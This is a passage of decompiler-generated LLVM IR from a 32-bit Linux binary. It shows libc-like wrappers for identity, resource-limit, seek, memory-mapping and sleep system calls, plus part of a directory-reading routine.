  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_80525e2.lr.ph ], [ %v3_8052624, %dec_label_pc_8052624 ]
  %v0_805263032 = phi i32 [ %v1_8052597, %dec_label_pc_80525e2.lr.ph ], [ %v2_805266d, %dec_label_pc_8052624 ]
  %v1_805263531 = phi i32 [ %tmp14, %dec_label_pc_80525e2.lr.ph ], [ %v2_80525f2, %dec_label_pc_8052624 ]
  %v0_80525fc30 = phi i32 [ %v3_80525a9, %dec_label_pc_80525e2.lr.ph ], [ %v1_805266f, %dec_label_pc_8052624 ]
  %v1_80525e2 = add i32 %v0_805263032, 16
  %v2_80525e2 = inttoptr i32 %v1_80525e2 to i16*
  %v3_80525e2 = load i16, i16* %v2_80525e2, align 2
  %v4_80525e2 = zext i16 %v3_80525e2 to i32
  %v1_80525e6 = add nuw nsw i32 %v4_80525e2, 3
  %v1_80525ec = and i32 %v1_80525e6, 131068
  store i32 %v1_80525ec, i32* %ecx.global-to-local, align 4
  store i32 %v5_80525ef, i32* %eax.global-to-local, align 4
  %v2_80525f2 = add i32 %v1_80525ec, %v1_805263531
  %tmp40 = icmp ugt i32 %v2_80525f2, %v5_80525ef
  br i1 %tmp40, label %dec_label_pc_80525fc, label %dec_label_pc_8052624

dec_label_pc_80525fc:                             ; preds = %dec_label_pc_80525e2
  %v1_80525fc = add i32 %v0_80525fc30, -4
  %v2_80525fc = inttoptr i32 %v1_80525fc to i32*
  store i32 0, i32* %v2_80525fc, align 4
  %v5_80525fe = add i32 %v0_80525fc30, -8
  %v6_80525fe = inttoptr i32 %v5_80525fe to i32*
  store i32 %stack_var_-32.034, i32* %v6_80525fe, align 4
  %v5_8052601 = add i32 %v0_80525fc30, -12
  %v6_8052601 = inttoptr i32 %v5_8052601 to i32*
  store i32 %stack_var_-36.033, i32* %v6_8052601, align 4
  %v5_8052604 = add i32 %v0_80525fc30, -16
  %v6_8052604 = inttoptr i32 %v5_8052604 to i32*
  store i32 %arg1, i32* %v6_8052604, align 4
  %v1_8052607 = call i32 @function_805278f(i32 %v2_80525f2)
  store i32 %v1_8052607, i32* %eax.global-to-local, align 4
  %v0_805260f = load i32, i32* @esi, align 4
  %v15_805260f = icmp eq i32 %v0_805260f, %tmp14
  %v1_8052612 = icmp eq i1 %v15_805260f, false
  br i1 %v1_8052612, label %dec_label_pc_8052680, label %dec_label_pc_8052614

dec_label_pc_8052614:                             ; preds = %dec_label_pc_80525fc
  %v1_8052614 = call i32 @function_805076b(i32 %v2_80525f2)
  store i32 %v1_8052614, i32* %eax.global-to-local, align 4
  %v1_8052619 = inttoptr i32 %v1_8052614 to i32*
  store i32 22, i32* %v1_8052619, align 4
  br label %dec_label_pc_8052685

dec_label_pc_8052624:                             ; preds = %dec_label_pc_80525e2
  %v1_8052624 = add i32 %v0_805263032, 8
  %v2_8052624 = inttoptr i32 %v1_8052624 to i32*
  %v3_8052624 = load i32, i32* %v2_8052624, align 4
  store i32 %v3_8052624, i32* %eax.global-to-local, align 4
  %v1_8052627 = add i32 %v0_805263032, 12
  %v2_8052627 = inttoptr i32 %v1_8052627 to i32*
  %v3_8052627 = load i32, i32* %v2_8052627, align 4
  %v1_8052630 = inttoptr i32 %v0_805263032 to i32*
  %v2_8052630 = load i32, i32* %v1_8052630, align 4
  store i32 %v2_8052630, i32* %eax.global-to-local, align 4
  %v1_8052632 = add i32 %v0_805263032, 4
  %v2_8052632 = inttoptr i32 %v1_8052632 to i32*
  %v3_8052632 = load i32, i32* %v2_8052632, align 4
  %v2_8052635 = add i32 %v1_805263531, 4
  %v3_8052635 = inttoptr i32 %v2_8052635 to i32*
  store i32 %v3_8052632, i32* %v3_8052635, align 4
  %v0_8052638 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052638 = load i32, i32* @esi, align 4
  %v2_8052638 = inttoptr i32 %v1_8052638 to i32*
  store i32 %v0_8052638, i32* %v2_8052638, align 4
  %v0_805263a = load i32, i32* @ebx, align 4
  %v1_805263a = add i32 %v0_805263a, 8
  %v2_805263a = inttoptr i32 %v1_805263a to i32*
  %v3_805263a = load i32, i32* %v2_805263a, align 4
  store i32 %v3_805263a, i32* %eax.global-to-local, align 4
  %v1_805263d = add i32 %v0_805263a, 12
  %v2_805263d = inttoptr i32 %v1_805263d to i32*
  %v3_805263d = load i32, i32* %v2_805263d, align 4
  %v1_8052640 = load i32, i32* @esi, align 4
  %v2_8052640 = add i32 %v1_8052640, 12
  %v3_8052640 = inttoptr i32 %v2_8052640 to i32*
  store i32 %v3_805263d, i32* %v3_8052640, align 4
  %v0_8052643 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052643 = load i32, i32* @esi, align 4
  %v2_8052643 = add i32 %v1_8052643, 8
  %v3_8052643 = inttoptr i32 %v2_8052643 to i32*
  store i32 %v0_8052643, i32* %v3_8052643, align 4
  %v0_8052646 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052646 = trunc i32 %v0_8052646 to i16
  %v2_8052646 = load i32, i32* @esi, align 4
  %v3_8052646 = add i32 %v2_8052646, 16
  %v4_8052646 = inttoptr i32 %v3_8052646 to i16*
  store i16 %v1_8052646, i16* %v4_8052646, align 2
  %v0_805264a = load i32, i32* @ebx, align 4
  %v1_805264a = add i32 %v0_805264a, 18
  %v2_805264a = inttoptr i32 %v1_805264a to i8*
  %v3_805264a = load i8, i8* %v2_805264a, align 1
  %v4_805264a = zext i8 %v3_805264a to i32
  %v5_805264a = load i32, i32* %eax.global-to-local, align 4
  %v6_805264a = and i32 %v5_805264a, -256
  %v7_805264a = or i32 %v6_805264a, %v4_805264a
  store i32 %v7_805264a, i32* %eax.global-to-local, align 4
  %v2_805264d = load i32, i32* @esi, align 4
  %v3_805264d = add i32 %v2_805264d, 18
  %v4_805264d = inttoptr i32 %v3_805264d to i8*
  store i8 %v3_805264a, i8* %v4_805264d, align 1
  %v0_8052650 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052650 = load i32, i32* @esp, align 4
  %v2_8052650 = add i32 %v1_8052650, -4
  %v3_8052650 = inttoptr i32 %v2_8052650 to i32*
  store i32 %v0_8052650, i32* %v3_8052650, align 4
  %v0_8052651 = load i32, i32* @ebx, align 4
  %v1_8052651 = add i32 %v0_8052651, 16
  %v2_8052651 = inttoptr i32 %v1_8052651 to i16*
  %v3_8052651 = load i16, i16* %v2_8052651, align 2
  %v4_8052651 = zext i16 %v3_8052651 to i32
  %v1_8052655 = add nsw i32 %v4_8052651, -19
  %v2_8052658 = add i32 %v1_8052650, -8
  %v3_8052658 = inttoptr i32 %v2_8052658 to i32*
  store i32 %v1_8052655, i32* %v3_8052658, align 4
  %v0_8052659 = load i32, i32* @ebx, align 4
  %v1_8052659 = add i32 %v0_8052659, 19
  %v2_805265c = add i32 %v1_8052650, -12
  %v3_805265c = inttoptr i32 %v2_805265c to i32*
  store i32 %v1_8052659, i32* %v3_805265c, align 4
  %v0_805265d = load i32, i32* @esi, align 4
  %v1_805265d = add i32 %v0_805265d, 19
  store i32 %v1_805265d, i32* %eax.global-to-local, align 4
  %v2_8052660 = add i32 %v1_8052650, -16
  %v3_8052660 = inttoptr i32 %v2_8052660 to i32*
  store i32 %v1_805265d, i32* %v3_8052660, align 4
  %v3_8052661 = inttoptr i32 %v2_80525f2 to i16*
  %v4_8052661 = call i32 @function_805298a(i16* %v3_8052661, i32 %v3_8052624, i32 %v3_8052627)
  store i32 %v4_8052661, i32* %eax.global-to-local, align 4
  %v0_8052666 = load i32, i32* @ebx, align 4
  %v1_8052666 = add i32 %v0_8052666, 16
  %v2_8052666 = inttoptr i32 %v1_8052666 to i16*
  %v3_8052666 = load i16, i16* %v2_8052666, align 2
  %v4_8052666 = zext i16 %v3_8052666 to i32
  store i32 %v2_80525f2, i32* @esi, align 4
  %v2_805266d = add i32 %v4_8052666, %v0_8052666
  store i32 %v2_805266d, i32* @ebx, align 4
  %v0_805266f = load i32, i32* @esp, align 4
  %v1_805266f = add i32 %v0_805266f, 16
  store i32 %v5_8052675, i32* %eax.global-to-local, align 4
  %v7_8052678 = icmp ult i32 %v2_805266d, %v5_8052675
  br i1 %v7_8052678, label %dec_label_pc_80525e2, label %dec_label_pc_8052680

dec_label_pc_8052680:                             ; preds = %dec_label_pc_80525c9, %dec_label_pc_8052624, %dec_label_pc_80525fc
  %v0_8052680 = phi i32 [ %v0_805260f, %dec_label_pc_80525fc ], [ %tmp14, %dec_label_pc_80525c9 ], [ %v2_80525f2, %dec_label_pc_8052624 ]
  store i32 %v0_8052680, i32* %eax.global-to-local, align 4
  %v5_8052682 = sub i32 %v0_8052680, %tmp14
  br label %dec_label_pc_8052685

dec_label_pc_8052685:                             ; preds = %dec_label_pc_8052614, %dec_label_pc_80525b4, %dec_label_pc_8052680
  %storemerge = phi i32 [ %v5_8052682, %dec_label_pc_8052680 ], [ -1, %dec_label_pc_80525b4 ], [ -1, %dec_label_pc_8052614 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805257e, i32* @ebx, align 4
  store i32 %v0_805257c, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8052680, { 1, 0 }
  uselistorder i32 %v2_805266d, { 0, 2, 1 }
  uselistorder i32 %v3_8052627, { 1, 0 }
  uselistorder i32 %v3_8052624, { 1, 2, 0 }
  uselistorder i32 %v2_80525f2, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_80525fc30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805263032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8052675, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80525a7, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_805298a, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 5, 6, 2, 3, 4, 9, 7, 8, 0, 1 }
  uselistorder i32 -12, { 0, 7, 32, 33, 1, 2, 22, 23, 24, 25, 9, 10, 26, 12, 13, 14, 20, 15, 16, 17, 8, 21, 19, 3, 27, 18, 11, 4, 28, 29, 5, 6, 30, 31 }
  uselistorder i32 -8, { 0, 3, 34, 32, 35, 33, 36, 37, 38, 18, 19, 20, 21, 22, 23, 5, 6, 24, 8, 9, 10, 16, 11, 12, 13, 4, 17, 15, 25, 26, 14, 7, 1, 27, 28, 2, 29, 30, 31 }
  uselistorder i32* @esp, { 15, 16, 17, 5, 6, 7, 8, 9, 30, 31, 32, 33, 34, 35, 36, 37, 12, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 80, 81, 82, 10, 14, 13, 126, 127, 144, 145, 146, 83, 84, 85, 86, 87, 88, 89, 90, 116, 117, 92, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 104, 105, 106, 107, 108, 109, 118, 119, 120, 121, 122, 123, 124, 125, 110, 111, 112, 113, 114, 115, 165, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 159, 160, 93, 91, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 161, 162, 163, 2, 164, 166, 167, 168, 169, 170, 171, 172, 199, 173, 174, 175, 176, 177, 179, 180, 178, 181, 182, 183, 184, 185, 186, 195, 196, 197, 187, 188, 189, 190, 191, 192, 193, 194, 11, 198, 1, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 4, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 9, 55, 56, 2, 3, 36, 37, 38, 39, 40, 15, 12, 13, 41, 42, 21, 14, 16, 17, 18, 19, 20, 32, 33, 23, 22, 24, 25, 26, 27, 10, 11, 34, 35, 30, 31, 4, 43, 44, 28, 29, 1, 5, 45, 6, 46, 47, 48, 7, 8, 50, 49, 51, 52, 53, 54 }
  uselistorder i32 30, { 4, 3, 1, 0, 5, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052685, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052680, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80525e2, { 1, 0 }
}

define i32 @function_805268d() local_unnamed_addr {
dec_label_pc_805268d:
  %stack_var_-8 = alloca i32, align 4
  %v2_8052690 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052697 = call i32 @function_8052737(i32 7, i32 %v2_8052690)
  store i32 256, i32* @edx, align 4
  %v2_80526a4 = icmp slt i32 %v2_8052697, 0
  br i1 %v2_80526a4, label %dec_label_pc_80526ac, label %dec_label_pc_80526a8

dec_label_pc_80526a8:                             ; preds = %dec_label_pc_805268d
  %v3_80526a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80526a8, i32* @edx, align 4
  br label %dec_label_pc_80526ac

dec_label_pc_80526ac:                             ; preds = %dec_label_pc_805268d, %dec_label_pc_80526a8
  %v0_80526ac = phi i32 [ 256, %dec_label_pc_805268d ], [ %v3_80526a8, %dec_label_pc_80526a8 ]
  ret i32 %v0_80526ac

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 7, 8, 9, 6, 5 }
  uselistorder label %dec_label_pc_80526ac, { 1, 0 }
}

define i32 @function_80526b2() local_unnamed_addr {
dec_label_pc_80526b2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80526b2 = load i32, i32* @ebx, align 4
  store i32 %v0_80526b2, i32* %stack_var_-4, align 4
  %v1_80526bb = call i32 @int80_syscall(i32 202)
  store i32 %v1_80526bb, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80526bb, -4095
  br i1 %tmp7, label %dec_label_pc_80526d2, label %dec_label_pc_80526c6

dec_label_pc_80526c6:                             ; preds = %dec_label_pc_80526b2
  %v1_80526c6 = call i32 @function_805076b(i32 %v0_80526b2)
  %v0_80526cb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526cb = sub i32 0, %v0_80526cb
  %v2_80526cd = inttoptr i32 %v1_80526c6 to i32*
  store i32 %v1_80526cb, i32* %v2_80526cd, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80526d6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80526d2

dec_label_pc_80526d2:                             ; preds = %dec_label_pc_80526b2, %dec_label_pc_80526c6
  %v2_80526d6 = phi i32 [ %v0_80526b2, %dec_label_pc_80526b2 ], [ %v2_80526d6.pre, %dec_label_pc_80526c6 ]
  %v0_80526d2 = phi i32 [ %v1_80526bb, %dec_label_pc_80526b2 ], [ -1, %dec_label_pc_80526c6 ]
  store i32 %v2_80526d6, i32* @ebx, align 4
  ret i32 %v0_80526d2

; uselistorder directives
  uselistorder i32 %v1_80526bb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80526d2, { 1, 0 }
}

define i32 @function_80526d8() local_unnamed_addr {
dec_label_pc_80526d8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80526d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80526d8, i32* %stack_var_-4, align 4
  %v1_80526e1 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80526e1, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80526e1, -4095
  br i1 %tmp7, label %dec_label_pc_80526f8, label %dec_label_pc_80526ec

dec_label_pc_80526ec:                             ; preds = %dec_label_pc_80526d8
  %v1_80526ec = call i32 @function_805076b(i32 %v0_80526d8)
  %v0_80526f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526f1 = sub i32 0, %v0_80526f1
  %v2_80526f3 = inttoptr i32 %v1_80526ec to i32*
  store i32 %v1_80526f1, i32* %v2_80526f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80526fc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80526f8

dec_label_pc_80526f8:                             ; preds = %dec_label_pc_80526d8, %dec_label_pc_80526ec
  %v2_80526fc = phi i32 [ %v0_80526d8, %dec_label_pc_80526d8 ], [ %v2_80526fc.pre, %dec_label_pc_80526ec ]
  %v0_80526f8 = phi i32 [ %v1_80526e1, %dec_label_pc_80526d8 ], [ -1, %dec_label_pc_80526ec ]
  store i32 %v2_80526fc, i32* @ebx, align 4
  ret i32 %v0_80526f8

; uselistorder directives
  uselistorder i32 %v1_80526e1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80526f8, { 1, 0 }
}

define i32 @function_80526fe() local_unnamed_addr {
dec_label_pc_80526fe:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80526fe = load i32, i32* @ebx, align 4
  store i32 %v0_80526fe, i32* %stack_var_-4, align 4
  %v1_8052707 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8052707, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052707, -4095
  br i1 %tmp7, label %dec_label_pc_805271e, label %dec_label_pc_8052712

dec_label_pc_8052712:                             ; preds = %dec_label_pc_80526fe
  %v1_8052712 = call i32 @function_805076b(i32 %v0_80526fe)
  %v0_8052717 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052717 = sub i32 0, %v0_8052717
  %v2_8052719 = inttoptr i32 %v1_8052712 to i32*
  store i32 %v1_8052717, i32* %v2_8052719, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052722.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805271e

dec_label_pc_805271e:                             ; preds = %dec_label_pc_80526fe, %dec_label_pc_8052712
  %v2_8052722 = phi i32 [ %v0_80526fe, %dec_label_pc_80526fe ], [ %v2_8052722.pre, %dec_label_pc_8052712 ]
  %v0_805271e = phi i32 [ %v1_8052707, %dec_label_pc_80526fe ], [ -1, %dec_label_pc_8052712 ]
  store i32 %v2_8052722, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805271e

; uselistorder directives
  uselistorder i32 %v1_8052707, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805271e, { 1, 0 }
}

define i32 @function_8052724() local_unnamed_addr {
dec_label_pc_8052724:
  %v0_8052724 = load i32, i32* @global_var_80543e4.64, align 4
  %v1_805272e = icmp eq i32 %v0_8052724, 0
  %.v0_8052724 = select i1 %v1_805272e, i32 4096, i32 %v0_8052724
  store i32 %.v0_8052724, i32* @edx, align 4
  ret i32 %.v0_8052724

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_8052737(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052737:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052737 = load i32, i32* @ebx, align 4
  store i32 %v0_8052737, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805274a = call i32 @int80_syscall(i32 191)
  store i32 %v1_805274a, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805274a, -4095
  br i1 %tmp9, label %dec_label_pc_8052763, label %dec_label_pc_8052757

dec_label_pc_8052757:                             ; preds = %dec_label_pc_8052737
  %v1_8052757 = call i32 @function_805076b(i32 %v0_8052737)
  %v0_805275c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805275c = sub i32 0, %v0_805275c
  %v2_805275e = inttoptr i32 %v1_8052757 to i32*
  store i32 %v1_805275c, i32* %v2_805275e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052767.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052763

dec_label_pc_8052763:                             ; preds = %dec_label_pc_8052737, %dec_label_pc_8052757
  %v2_8052767 = phi i32 [ %v0_8052737, %dec_label_pc_8052737 ], [ %v2_8052767.pre, %dec_label_pc_8052757 ]
  %v0_8052763 = phi i32 [ %v1_805274a, %dec_label_pc_8052737 ], [ -1, %dec_label_pc_8052757 ]
  store i32 %v2_8052767, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052763

; uselistorder directives
  uselistorder i32 %v1_805274a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052763, { 1, 0 }
}

define i32 @function_8052769() local_unnamed_addr {
dec_label_pc_8052769:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052769 = load i32, i32* @ebx, align 4
  store i32 %v0_8052769, i32* %stack_var_-4, align 4
  %v1_8052772 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8052772, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052772, -4095
  br i1 %tmp7, label %dec_label_pc_8052789, label %dec_label_pc_805277d

dec_label_pc_805277d:                             ; preds = %dec_label_pc_8052769
  %v1_805277d = call i32 @function_805076b(i32 %v0_8052769)
  %v0_8052782 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052782 = sub i32 0, %v0_8052782
  %v2_8052784 = inttoptr i32 %v1_805277d to i32*
  store i32 %v1_8052782, i32* %v2_8052784, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805278d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052789

dec_label_pc_8052789:                             ; preds = %dec_label_pc_8052769, %dec_label_pc_805277d
  %v2_805278d = phi i32 [ %v0_8052769, %dec_label_pc_8052769 ], [ %v2_805278d.pre, %dec_label_pc_805277d ]
  %v0_8052789 = phi i32 [ %v1_8052772, %dec_label_pc_8052769 ], [ -1, %dec_label_pc_805277d ]
  store i32 %v2_805278d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052789

; uselistorder directives
  uselistorder i32 %v1_8052772, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052789, { 1, 0 }
}

define i32 @function_805278f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805278f:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_80527a5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80527a5, i32* %esi.global-to-local, align 4
  %v1_80527bc = call i32 @int80_syscall(i32 140)
  store i32 %v1_80527bc, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80527bc, -4095
  br i1 %tmp18, label %dec_label_pc_80527d6, label %dec_label_pc_80527c8

dec_label_pc_80527c8:                             ; preds = %dec_label_pc_805278f
  %v2_80527a9 = ashr i32 %tmp8, 31
  %v1_80527c8 = call i32 @function_805076b(i32 %v2_80527a9)
  %v0_80527cd = load i32, i32* %esi.global-to-local, align 4
  %v1_80527cd = sub i32 0, %v0_80527cd
  %v2_80527cf = inttoptr i32 %v1_80527c8 to i32*
  store i32 %v1_80527cd, i32* %v2_80527cf, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80527da

dec_label_pc_80527d6:                             ; preds = %dec_label_pc_805278f
  %v1_80527d6 = icmp eq i32 %v1_80527bc, 0
  br i1 %v1_80527d6, label %dec_label_pc_80527df, label %dec_label_pc_80527da

dec_label_pc_80527da:                             ; preds = %dec_label_pc_80527d6, %dec_label_pc_80527c8
  %v0_80527da = phi i32 [ %v1_80527bc, %dec_label_pc_80527d6 ], [ -1, %dec_label_pc_80527c8 ]
  br label %dec_label_pc_80527e7

dec_label_pc_80527df:                             ; preds = %dec_label_pc_80527d6
  %v3_80527df = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80527e7

dec_label_pc_80527e7:                             ; preds = %dec_label_pc_80527da, %dec_label_pc_80527df
  %v0_80527ed = phi i32 [ %v0_80527da, %dec_label_pc_80527da ], [ %v3_80527df, %dec_label_pc_80527df ]
  ret i32 %v0_80527ed

; uselistorder directives
  uselistorder i32 %v1_80527bc, { 1, 2, 0, 3 }
  uselistorder i32 31, { 7, 5, 0, 1, 2, 3, 6, 4, 8 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80527e7, { 1, 0 }
}

define i32 @function_80527ee(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80527ee:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80527ef = load i32, i32* @esi, align 4
  store i32 %v0_80527ef, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052807 = load i32, i32* @ebx, align 4
  %v5_805280f = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_805280f = ptrtoint i32* %v5_805280f to i32
  store i32 %v0_8052807, i32* @ebx, align 4
  store i32 %v6_805280f, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_805280f, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_805281b, label %dec_label_pc_8052827

dec_label_pc_805281b:                             ; preds = %dec_label_pc_80527ee
  %v1_805281b = call i32 @function_805076b(i32 %v0_8052807)
  %v0_8052820 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052820 = sub i32 0, %v0_8052820
  %v2_8052822 = inttoptr i32 %v1_805281b to i32*
  store i32 %v1_8052820, i32* %v2_8052822, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805282a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052827

dec_label_pc_8052827:                             ; preds = %dec_label_pc_80527ee, %dec_label_pc_805281b
  %v2_805282a = phi i32 [ %v0_80527ef, %dec_label_pc_80527ee ], [ %v2_805282a.pre, %dec_label_pc_805281b ]
  %v0_8052827 = phi i32 [ %v6_805280f, %dec_label_pc_80527ee ], [ -1, %dec_label_pc_805281b ]
  %v2_8052829 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052829, i32* @edx, align 4
  store i32 %v2_805282a, i32* @esi, align 4
  ret i32 %v0_8052827

; uselistorder directives
  uselistorder i32 %v0_8052807, { 1, 0 }
  uselistorder label %dec_label_pc_8052827, { 1, 0 }
}

define i32 @function_805282d(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805282d:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805282d = load i32, i32* @ebx, align 4
  store i32 %v0_805282d, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8052840 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8052840, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8052840, -4095
  br i1 %tmp10, label %dec_label_pc_8052859, label %dec_label_pc_805284d

dec_label_pc_805284d:                             ; preds = %dec_label_pc_805282d
  %v1_805284d = call i32 @function_805076b(i32 %v0_805282d)
  %v0_8052852 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052852 = sub i32 0, %v0_8052852
  %v2_8052854 = inttoptr i32 %v1_805284d to i32*
  store i32 %v1_8052852, i32* %v2_8052854, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805285d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052859

dec_label_pc_8052859:                             ; preds = %dec_label_pc_805282d, %dec_label_pc_805284d
  %v2_805285d = phi i32 [ %v0_805282d, %dec_label_pc_805282d ], [ %v2_805285d.pre, %dec_label_pc_805284d ]
  %v0_8052859 = phi i32 [ %v3_8052840, %dec_label_pc_805282d ], [ -1, %dec_label_pc_805284d ]
  %v2_805285b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805285b, i32* @edx, align 4
  store i32 %v2_805285d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052859

; uselistorder directives
  uselistorder i32 %v3_8052840, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052859, { 1, 0 }
}

define i32 @function_805285f(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805285f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_805285f = load i32, i32* @ebx, align 4
  store i32 %v0_805285f, i32* %stack_var_-4, align 4
  %v4_8052863 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8052863, i32* %ebx.global-to-local, align 4
  %v6_8052872 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8052872, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8052872, -4095
  br i1 %tmp11, label %dec_label_pc_805288b, label %dec_label_pc_805287f

dec_label_pc_805287f:                             ; preds = %dec_label_pc_805285f
  %v1_805287f = call i32 @function_805076b(i32 %v0_805285f)
  %v0_8052884 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052884 = sub i32 0, %v0_8052884
  %v2_8052886 = inttoptr i32 %v1_805287f to i32*
